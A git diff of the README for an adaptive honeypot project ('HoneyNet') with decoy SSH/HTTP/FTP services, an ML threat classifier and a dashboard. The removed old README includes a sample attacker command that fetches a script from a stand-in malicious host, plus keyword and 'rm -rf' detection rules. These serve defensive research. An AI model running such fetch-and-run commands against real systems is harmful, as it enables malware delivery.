@@ -1,736 +1,151 @@
-# AI-Driven Adaptive Honeynet System
+# HoneyNet
 
-## 🎯 Project Overview
+AI-driven adaptive honeynet: decoy SSH/HTTP/FTP services feed events into a Node.js controller, an ML classifier, PostgreSQL, and a React dashboard.
 
-An **AI-powered adaptive honeypot system** that dynamically responds to attacker behavior in real-time. The system monitors SSH honeypot interactions, uses machine learning to classify threats, and automatically adapts the honeypot environment to engage attackers more effectively.
+Application code under `src/`, `frontend/`, `ml-service/`, and `honeypots/` is unchanged. This cleanup only removed leftover docs, duplicate start scripts, and the unused `ai_honeynet_inference` copy of the ML service.
 
-### Key Features
+## Layout
 
-- **Real-time Log Analysis**: Monitors Cowrie SSH honeypot logs in real-time
-- **ML-Based Threat Classification**: Classifies events by severity (LOW, MEDIUM, HIGH)
-- **Adaptive Response System**: Automatically modifies honeypot behavior based on threat level
-- **Comprehensive Analytics**: Tracks attackers, sessions, commands, and trends
-- **RESTful API**: Full-featured API for event queries and statistics
-
----
-
-## 📋 Implementation Status
-
-### ✅ Phase 1: Backend Controller (IMPLEMENTED)
-
-**Status**: **COMPLETE** ✓
-
-The Node.js backend is fully implemented and functional.
-
-#### Components Implemented:
-
-**1. Database Layer** ([schema.sql](file:///c:/Users/Mohit%20Patil/Desktop/AI-Proj/HoneyNet/src/database/schema.sql))
-- **4 Core Tables**:
-  - `sessions` - Tracks attacker sessions with duration, event counts
-| Endpoint | Purpose |
-|----------|---------|
-| `GET /api/events` | Paginated events with filters (severity, IP, type, date range) |
-| `GET /api/events/:id` | Single event details with session context |
-| `GET /api/stats` | Overall statistics and trends |
-| `GET /api/stats/severity-trends` | Time-based severity analysis |
-| `GET /api/attackers` | Attacker profiles and rankings |
-| `GET /api/adaptations` | Adaptation history |
-
-**4. Security Features**
-- Helmet.js for HTTP security headers
-- CORS protection
-- Rate limiting (configurable, default: 100 req/15min)
-- Input validation with Joi
-- Graceful shutdown handling
-
-**5. Logging System**
-- Winston for structured logging
-- Event-specific log methods
-- Configurable log levels
-- File and console outputs
-
-#### Data Flow:
-
-```mermaid
-graph LR
-    A[Cowrie Honeypot] -->|JSON Logs| B[Log Watcher]
-    B --> C[Event Normalizer]
-    C --> D[Event Processor]
-    D --> E[PostgreSQL Database]
-    D --> F[ML Service]
-    F --> D
-    D --> G[Adaptation Service]
-    G --> A
-    E --> H[REST API]
+```
+HoneyNet/
+├── start.ps1                      # Start ML + backend + dashboard
+├── docker-compose.yml             # Postgres, ML, backend, frontend
+├── docker-compose-honeypots.yml   # Isolated HTTP/FTP honeypot containers
+├── src/                           # Node.js API and log watchers
+├── frontend/                      # Vite + React dashboard
+├── ml-service/                    # FastAPI threat scoring (port 8001)
+├── honeypots/                     # HTTP/FTP/Telnet decoys and Docker builds
+├── mock-data/                     # Sample Cowrie JSON for local/Docker use
+├── scripts/                       # Cowrie install, WSL helpers, Docker honeypots
+└── .env.example                   # Copy to .env and set credentials
 ```
 
----
+## Prerequisites
 
-### ❌ Phase 2: ML Service (NOT IMPLEMENTED)
+- Node.js 16+ and npm
+- Python 3.10+ (for the ML service)
+- PostgreSQL 15 (local) **or** Docker Desktop
+- Optional: WSL Ubuntu 22.04 for Cowrie and the Python HTTP/FTP decoys
 
-**Status**: **MISSING** ✗
+## First-time setup
 
-#### What Should Be Implemented:
+1. Copy environment config and set a real database password:
 
-**Location**: Separate Python service (e.g., `/ml-service/`)
-
-**Required Components**:
-
-1. **Machine Learning Model**
-   - Threat classification (LOW/MEDIUM/HIGH severity)
-   - Anomaly detection using behavioral features
-   - Training pipeline for model updates
-
-2. **Feature Engineering**
-   - Extract features from events:
-     - Command patterns
-     - Username/password combinations
-     - Session duration and event frequency
-     - Time-based patterns
-     - IP reputation data
-
-3. **REST API** (Expected at `http://localhost:8001`)
-   - `POST /classify` - Classify single event
-   - `GET /health` - Service health check
-   - `POST /train` - Trigger model retraining
-
-4. **Model Types** (Suggested)
-   - Random Forest or XGBoost for classification
-   - Isolation Forest for anomaly detection
-   - LSTM for sequence-based pattern recognition
-
-**Current State**:
-- Backend has `mlClient.js` ready to communicate
-- Expected endpoint: `${ML_SERVICE_URL}/classify`
-- Health checks implemented but no service exists
-- Events marked as `is_analyzed = false` until ML service available
-
-#### Implementation Requirements:
-
-```python
-# Expected ML Service Structure
-ml-service/
-├── app.py                 # Flask/FastAPI server
-├── models/
-│   ├── classifier.pkl     # Trained classification model
-│   └── scaler.pkl        # Feature scaler
-├── feature_extraction.py  # Extract features from events
-├── config.py             # Model configuration
-└── requirements.txt      # Python dependencies
-```
-
-**Example Payload Expected**:
-```json
-POST /classify
-{
-  "event_id": "uuid",
-  "event_type": "cowrie.command.input",
-  "timestamp": "2024-11-29T12:00:00Z",
-  "source_ip": "192.168.1.100",
-  "command": "wget http://malicious.com/script.sh",
-  "username": "root",
-  "password": "admin123"
-}
-```
-
-**Expected Response**:
-```json
-{
-  "severity": "HIGH",
-  "anomaly_score": 0.85,
-  "labels": {
-    "attack_type": "malware_download",
-    "confidence": 0.92
-  },
-  "features": {
-    "command_length": 42,
-    "suspicious_keywords": ["wget", "http"]
-  }
-}
-```
-
----
-
-### ❌ Phase 3: Frontend Dashboard (NOT IMPLEMENTED)
-
-**Status**: **MISSING** ✗
-
-#### What Should Be Implemented:
-
-**Location**: Separate React/Vue.js application (e.g., `/frontend/`)
-
-**Required Features**:
-
-1. **Real-time Dashboard**
-   - Live event stream
-   - Attack severity heatmap
-   - Active sessions monitor
-   - Geographic IP visualization
-
-2. **Analytics Views**
-   - Time-series charts for events/hour
-   - Top attackers leaderboard
-   - Command frequency analysis
-   - Adaptation history timeline
-
-3. **Event Explorer**
-   - Searchable/filterable event log
-   - Session replay/timeline
-   - Attacker profile pages
-   - ML analysis details
-
-4. **Configuration Panel**
-   - Enable/disable auto-adaptation
-   - Adjust severity thresholds
-   - Cooldown period settings
-
-**Technology Stack** (Suggested):
-- React.js or Vue.js
-- Chart.js or D3.js for visualizations
-- WebSocket for real-time updates
-- TailwindCSS or Material-UI
-
-**Current State**:
-- No frontend code exists
-- API is CORS-enabled (default: `http://localhost:3001`)
-- All endpoints return JSON ready for consumption
-
----
-
-### ❌ Phase 4: Containerization (NOT IMPLEMENTED)
-
-**Status**: **MISSING** ✗
-
-#### What Should Be Implemented:
-
-**Required Files**:
-
-1. **docker-compose.yml** - Orchestrate all services
-2. **Backend Dockerfile** - Node.js container
-3. **ML Service Dockerfile** - Python container
-4. **Frontend Dockerfile** - React/Nginx container
-
-**Expected Architecture**:
-
-```yaml
-services:
-  database:
-    image: postgres:15
-    volumes: [ ./init.sql:/docker-entrypoint-initdb.d/schema.sql ]
-    
-  backend:
-    build: ./
-    depends_on: [ database, ml-service ]
-    
-  ml-service:
-    build: ./ml-service
-    
-  frontend:
-    build: ./frontend
-    depends_on: [ backend ]
-    
-  cowrie:
-    image: cowrie/cowrie
-    volumes: [ cowrie-logs:/home/cowrie/cowrie/var/log/cowrie ]
-```
-
-**Current State**:
-- No Docker configuration exists
-- PM2 ecosystem file available ([ecosystem.config.js](file:///c:/Users/Mohit%20Patil/Desktop/AI-Proj/HoneyNet/ecosystem.config.js)) for process management
-- Services expect local installations
-
----
-
-### ❌ Phase 5: Cowrie Honeypot (NOT INCLUDED)
-
-**Status**: **EXTERNAL DEPENDENCY** ⚠️
-
-The system expects a Cowrie SSH honeypot to be installed and running separately.
-
-**Required Configuration**:
-
-1. **Cowrie Installation**
-   - Install from: https://github.com/cowrie/cowrie
-   - Configure JSON logging format
-   - Set log path: `/home/cowrie/cowrie/var/log/cowrie/cowrie.json`
-
-2. **Environment Variables** (`.env`):
-   ```bash
-   COWRIE_LOG_PATH=/home/cowrie/cowrie/var/log/cowrie/cowrie.json
-   COWRIE_CONFIG_PATH=/home/cowrie/cowrie/etc/cowrie.cfg
-   COWRIE_HONEYFILES_PATH=/home/cowrie/cowrie/honeyfs
-   COWRIE_RESTART_COMMAND=sudo systemctl restart cowrie
-   ```
-
-3. **Adaptation Permissions**
-   - Backend needs write access to Cowrie config
-   - Ability to restart Cowrie service
-   - File system access for honeyfiles
-
-**Current State**:
-- Mock data exists: [mock-data/cowrie.json](file:///c:/Users/Mohit%20Patil/Desktop/AI-Proj/HoneyNet/mock-data/cowrie.json)
-- LogWatcher will wait for log file creation
-- Adaptation service ready but requires Cowrie
-
----
-
-## 🚀 Setup Instructions
-
-### Prerequisites
-
-- Node.js ≥16.0.0
-- PostgreSQL ≥13
-- Cowrie SSH honeypot (separate installation)
-- Python 3.9+ (for future ML service)
-
-### Backend Setup (Current Implementation)
-
-#### 1. Install Dependencies
-
-```bash
+```powershell
 cd HoneyNet
+copy .env.example .env
+```
+
+Edit `.env`: `DB_*` / `DATABASE_URL` must match PostgreSQL. For local Vite, keep `CORS_ORIGIN=http://localhost:5173`. Cowrie log path on Windows typically looks like:
+
+`COWRIE_LOG_PATH=\\wsl$\Ubuntu-22.04\home\cowrie\cowrie\var\log\cowrie\cowrie.json`
+
+2. Install Node dependencies:
+
+```powershell
 npm install
+cd frontend
+npm install
+cd ..
 ```
 
-#### 2. Configure Environment
+3. Create a Python venv for ML (from `HoneyNet`):
 
-```bash
-cp .env.example .env
-# Edit .env with your configuration
+```powershell
+cd ml-service
+python -m venv venv
+.\venv\Scripts\Activate.ps1
+pip install -r requirements.txt
+cd ..
 ```
 
-**Critical Environment Variables**:
-```bash
-# Database
-DATABASE_URL=postgresql://honeynet:password@localhost:5432/honeynet
+Trained files must exist in `ml-service/model/` (`isolation_forest_model.pkl`, `autoencoder_model_colab.keras`, scalers).
 
-# Cowrie
-COWRIE_LOG_PATH=/path/to/cowrie/var/log/cowrie/cowrie.json
+4. Create the database schema. Either:
 
-# ML Service
-ML_SERVICE_URL=http://localhost:8001
-
-# Adaptation
-ENABLE_AUTO_ADAPTATION=true
-HIGH_SEVERITY_THRESHOLD=0.7
-```
-
-#### 3. Initialize Database
-
-```bash
-# Create database
-createdb honeynet
-
-# Run migrations
+```powershell
+docker compose up -d database
 npm run migrate
 ```
 
-The migration script runs [src/database/schema.sql](file:///c:/Users/Mohit%20Patil/Desktop/AI-Proj/HoneyNet/src/database/schema.sql) which creates:
-- All tables with UUID primary keys
-- Indexes for performance
-- Triggers for timestamp updates
-- Views for common queries
+or point `.env` at an existing Postgres instance named `honeynet` and run `npm run migrate`.
 
-#### 4. Start Backend
-
-**Development Mode**:
-```bash
-npm run dev  # Runs with nodemon
-```
-
-**Production Mode**:
-```bash
-npm start  # Standard Node.js
-# or
-pm2 start ecosystem.config.js  # PM2 process manager
-```
-
-#### 5. Verify Backend
+5. Optional Cowrie (SSH decoy on port 2222), once, inside WSL:
 
 ```bash
-# Health check
-curl http://localhost:3000/health
-
-# Expected response
-{
-  "status": "healthy",
-  "timestamp": "2024-11-29T...",
-  "database": "connected",
-  "logWatcher": "active"  # or "inactive" if Cowrie logs missing
-}
+bash scripts/install-cowrie-wsl.sh
 ```
 
-### Known Limitations (Backend Only)
+If Cowrie should be reachable from other machines on your LAN, run `scripts/setup-wsl-port-forward.ps1` in an elevated PowerShell.
 
-1. **ML Service Not Available**
-   - Events will be stored but not classified
-   - `severity` stays as 'UNKNOWN'
-   - `is_analyzed` remains `false`
-   - Auto-adaptation won't trigger
+## Run (development — usual path)
 
-2. **No Frontend**
-   - API works but no visualization
-   - Must use curl/Postman to view data
+From `HoneyNet`:
 
-3. **Cowrie Required**
-   - Backend waits for log file
-   - Will log warnings if missing
-   - Can test with mock data
+```powershell
+.\start.ps1
+```
 
----
+That opens three windows: ML (`8001`), backend (`3000`), dashboard (`5173`). You can also start them yourself:
 
-## 🔧 Testing the Current Implementation
+```powershell
+# Terminal 1 — ML
+cd ml-service
+.\venv\Scripts\python.exe -m uvicorn app:app --host 0.0.0.0 --port 8001
 
-### Using Mock Data
+# Terminal 2 — API
+npm start
+
+# Terminal 3 — UI
+cd frontend
+npm run dev
+```
+
+Open **http://localhost:5173**. Health check: **http://localhost:3000/health**.
+
+Optional decoys (same Wi-Fi / local only):
+
+- HTTP/FTP Python honeypots: `start.ps1` prompts, or `wsl` + `scripts/start-all-honeypots.sh`
+- Docker HTTP/FTP: `.\scripts\start-docker-honeypots.ps1` (Docker Desktop must be running)
+- Cowrie: `wsl -d Ubuntu-22.04 -u cowrie -- bash scripts/start-cowrie.sh` if that script is copied into the Cowrie home, or:
 
 ```bash
-# Simulate Cowrie logs with mock data
-cat mock-data/cowrie.json >> /path/to/cowrie/cowrie.json
+wsl -d Ubuntu-22.04 -u cowrie -- bash -c "cd ~/cowrie && source cowrie-env/bin/activate && cowrie start"
 ```
 
-### API Testing Examples
+Firewall helper (Administrator): `.\scripts\setup-firewall-secure.ps1`
 
-#### Get Recent Events
-```bash
-curl "http://localhost:3000/api/events?limit=10&severity=HIGH"
+## Run (full Docker stack)
+
+From `HoneyNet`, with Docker Desktop running:
+
+```powershell
+docker compose up --build
 ```
 
-#### Get Statistics
-```bash
-curl http://localhost:3000/api/stats
-```
-
-#### Get Top Attackers
-```bash
-curl http://localhost:3000/api/attackers?sort=threat&limit=5
-```
-
-#### Filter Events by IP
-```bash
-curl "http://localhost:3000/api/events?source_ip=192.168.1.100"
-```
-
----
-
-## 🏗️ Architecture & Data Flow
-
-### System Architecture
-
-```mermaid
-graph TB
-    subgraph "MISSING: Frontend"
-        UI[Dashboard UI]
-        WS[WebSocket Connection]
-    end
-    
-    subgraph "IMPLEMENTED: Backend"
-        API[REST API<br/>Express.js]
-        LW[Log Watcher<br/>Tail Service]
-        EP[Event Processor]
-        AS[Adaptation Service]
-    end
-    
-    subgraph "IMPLEMENTED: Database"
-        PG[(PostgreSQL<br/>Events, Sessions,<br/>Attackers, Adaptations)]
-    end
-    
-    subgraph "MISSING: ML Service"
-        ML[ML Classifier<br/>Python/scikit-learn]
-    end
-    
-    subgraph "EXTERNAL: Honeypot"
-        CH[Cowrie Honeypot<br/>SSH Emulator]
-        LOGS[cowrie.json logs]
-    end
-    
-    CH -->|Writes| LOGS
-    LW -->|Monitors| LOGS
-    LW --> EP
-    EP --> PG
-    EP -.->|HTTP| ML
-    ML -.-> EP
-    EP --> AS
-    AS -.->|Modify Config| CH
-    PG --> API
-    UI -.->|HTTP| API
-    API -.-> WS
-```
-
-### Event Processing Pipeline
-
-```mermaid
-sequenceDiagram
-    participant Cowrie
-    participant LogWatcher
-    participant Normalizer
-    participant Processor
-    participant Database
-    participant ML Service
-    participant Adaptation
-    
-    Cowrie->>LogWatcher: Write JSON event
-    LogWatcher->>Normalizer: Parse line
-    Normalizer->>Processor: Normalized event
-    Processor->>Database: Store event
-    Processor->>Database: Update session
-    Processor->>Database: Update attacker
-    Processor->>ML Service: Classify event
-    ML Service->>Processor: Severity + score
-    Processor->>Database: Update with ML results
-    
-    alt severity == HIGH
-        Processor->>Adaptation: Trigger adaptation
-        Adaptation->>Cowrie: Modify config/files
-        Adaptation->>Database: Record adaptation
-    end
-```
-
----
-
-## 📊 Database Schema
-
-### Tables Overview
-
-#### `sessions`
-Tracks attacker sessions from connection to disconnect.
-
-| Column | Type | Description |
-|--------|------|-------------|
-| id | UUID | Primary key |
-| session_id | VARCHAR | Cowrie session identifier |
-| source_ip | VARCHAR | Attacker IP address |
-| start_time | TIMESTAMP | Session start |
-| end_time | TIMESTAMP | Session end (null if active) |
-| event_count | INTEGER | Total events in session |
-| command_count | INTEGER | Commands executed |
-| successful_login | BOOLEAN | Did attacker login successfully |
-| is_active | BOOLEAN | Session still ongoing |
-
-#### `events`
-All honeypot events with ML analysis.
-
-| Column | Type | Description |
-|--------|------|-------------|
-| id | UUID | Primary key |
-| event_type | VARCHAR | cowrie.login.success, cowrie.command.input, etc |
-| timestamp | TIMESTAMP | Event occurrence time |
-| source_ip | VARCHAR | Attacker IP |
-| command | TEXT | Shell command executed |
-| severity | VARCHAR | LOW/MEDIUM/HIGH (from ML) |
-| anomaly_score | FLOAT | ML anomaly score 0-1 |
-| is_analyzed | BOOLEAN | Has ML processed this |
-| raw_event | JSONB | Original Cowrie JSON |
-
-#### `attackers`
-Behavioral profiles of attacking IPs.
-
-| Column | Type | Description |
-|--------|------|-------------|
-| ip_address | VARCHAR | Attacker IP (unique) |
-| threat_level | VARCHAR | LOW/MEDIUM/HIGH/CRITICAL |
-| total_events | INTEGER | All events from this IP |
-| high_severity_count | INTEGER | High-severity events |
-| most_common_username | VARCHAR | Favorite username tried |
-| unique_passwords_count | INTEGER | Password variety |
-
-#### `adaptations`
-History of adaptive actions taken.
-
-| Column | Type | Description |
-|--------|------|-------------|
-| action_type | VARCHAR | BANNER_CHANGE, HONEYFILE_ADDITION, etc |
-| severity | VARCHAR | Trigger severity level |
-| action_details | JSONB | What was changed |
-| success | BOOLEAN | Did action execute successfully |
-| old_config | JSONB | Previous configuration |
-| new_config | JSONB | Updated configuration |
-
----
-
-## 🔄 Adaptive Behaviors
-
-The system can automatically modify the honeypot environment based on attacker behavior.
-
-### Trigger Conditions
-
-- **HIGH Severity Event** detected by ML
-- Auto-adaptation enabled (`ENABLE_AUTO_ADAPTATION=true`)
-- Not in cooldown period (default: 300 seconds)
-
-### Adaptation Types
-
-| Action | When | What It Does |
-|--------|------|--------------|
-| **Banner Change** | Random attackers | Modifies SSH banner to appear as different OS/service |
-| **Fake AWS Creds** | Attacker searches for AWS | Adds `.aws/credentials` with fake keys |
-| **Fake DB Config** | SQL-related commands | Creates fake `database.conf` with credentials |
-| **Fake SSH Keys** | Key enumeration attempts | Adds `.ssh/id_rsa` private key (fake) |
-| **Fake Backup Script** | Looking for cron/backups | Adds `backup.sh` with sensitive-looking paths |
-
-### Implementation Details
-
-All adaptations are implemented in [adaptationService.js](file:///c:/Users/Mohit%20Patil/Desktop/AI-Proj/HoneyNet/src/services/adaptationService.js):
-
-- Modifies Cowrie configuration files
-- Creates/updates honeyfiles in Cowrie filesystem
-- Records all changes in database
-- Can rollback if needed
-- Restarts Cowrie service after changes
-
----
-
-## 🐛 Troubleshooting
-
-### Common Issues
-
-#### 1. Log Watcher Not Starting
-
-**Symptom**: Backend starts but shows `logWatcher: inactive`
-
-**Causes**:
-- Cowrie not installed/running
-- Incorrect `COWRIE_LOG_PATH` in `.env`
-- Permission issues
-
-**Solutions**:
-```bash
-# Check if Cowrie is running
-ps aux | grep cowrie
-
-# Verify log file exists
-ls -la /home/cowrie/cowrie/var/log/cowrie/cowrie.json
-
-# Check permissions
-sudo chown youruser:yourgroup /path/to/cowrie/var/log/cowrie/cowrie.json
-```
-
-#### 2. ML Service Warnings
-
-**Symptom**: Logs show `ML service is not healthy, skipping classification`
-
-**Cause**: ML service not implemented yet
-
-**Workaround**:
-- Events still stored in database
-- Can manually update severity later:
-```sql
-UPDATE events SET severity = 'HIGH' WHERE command LIKE '%rm -rf%';
-```
-
-#### 3. Database Connection Failed
-
-**Symptom**: `Error: connect ECONNREFUSED ::1:5432`
-
-**Solutions**:
-```bash
-# Start PostgreSQL
-sudo systemctl start postgresql
-
-# Verify connection
-psql -U honeynet -d honeynet
-
-# Check DATABASE_URL in .env matches your setup
-```
-
-#### 4. Adaptation Failures
-
-**Symptom**: Adaptations recorded with `success: false`
-
-**Causes**:
-- Cowrie not running
-- Permission issues for config/file modifications
-- Invalid paths in environment variables
-
-**Solutions**:
-```bash
-# Grant write permissions
-chown -R youruser:yourgroup /home/cowrie/cowrie/etc
-chown -R youruser:yourgroup /home/cowrie/cowrie/honeyfs
-
-# Test Cowrie restart command
-sudo systemctl restart cowrie
-```
-
----
-
-## 📈 Next Steps for Complete Implementation
-
-To make this a fully functional AI-driven honeypot, implement in this order:
-
-### Priority 1: ML Service (Critical)
-
-Without this, the system cannot classify threats or trigger adaptations effectively.
-
-**Steps**:
-1. Create `/ml-service/` directory
-2. Implement Flask/FastAPI server
-3. Train classification model on honeypot data
-4. Deploy at `http://localhost:8001`
-5. Test `/classify` endpoint
-
-**Estimated Effort**: 2-3 weeks
-
-### Priority 2: Docker Containerization (High)
-
-Makes deployment and scaling much easier.
-
-**Steps**:
-1. Write Dockerfiles for backend, ML service, frontend
-2. Create `docker-compose.yml`
-3. Configure networking between containers
-4. Add volume mounts for persistence
-
-**Estimated Effort**: 3-5 days
-
-### Priority 3: Frontend Dashboard (Medium)
-
-Visualization significantly improves usability.
-
-**Steps**:
-1. Set up React/Vue.js project
-2. Create dashboard with charts
-3. Implement real-time WebSocket updates
-4. Add event explorer and search
-
-**Estimated Effort**: 2-3 weeks
-
-### Priority 4: Testing & CI/CD (Medium)
-
-**Steps**:
-1. Write unit tests for services
-2. Integration tests for API endpoints
-3. Set up GitHub Actions
-4. Add test coverage reporting
-
-**Estimated Effort**: 1 week
-
----
-
-## 📄 License
-
-MIT License
-
----
-
-## 🤝 Contributing
-
-This is currently a backend-only implementation. Contributions welcome for:
-- ML service implementation
-- Frontend development
-- Docker containerization
-- Documentation improvements
-
----
-
-## 📞 Support
-
-For issues or questions:
-- Backend issues: Check logs in `./logs/app.log`
-- Database issues: Run health check at `/health`
-- API documentation: Visit `http://localhost:3000/api/`
-
----
-
-**Last Updated**: November 29, 2024  
-**Implementation Status**: Backend Only (Phase 1 Complete)  
-**Ready for**: Development of ML Service & Frontend
+- API: http://localhost:3000  
+- Dashboard: http://localhost:3001  
+- ML: http://localhost:8001  
+
+Set `.env` / compose `CORS_ORIGIN` to `http://localhost:3001` if you use this mode. This stack does not replace Cowrie in WSL; SSH decoy is still started separately if you need it.
+
+Stop: `docker compose down`
+
+## Ports
+
+| Service | Port |
+| --- | --- |
+| Backend API | 3000 |
+| Dashboard (Vite) | 5173 |
+| Dashboard (Docker nginx) | 3001 |
+| ML service | 8001 |
+| Postgres | 5432 |
+| Cowrie SSH | 2222 |
+| HTTP honeypot | 8080 |
+| FTP honeypot | 2121 |
+
+## Notes
+
+- Do not expose these ports to the public internet. Honeypots are for isolated lab or tightly firewalled research networks.
+- Logs write under `logs/`. Backend tails Cowrie JSON plus WSL paths `/tmp/http_honeypot.json` and `/tmp/ftp_honeypot.json` for the Python decoys.
+- `ENABLE_AUTO_ADAPTATION` and optional webhooks/API keys in `.env` stay off unless you configure them.
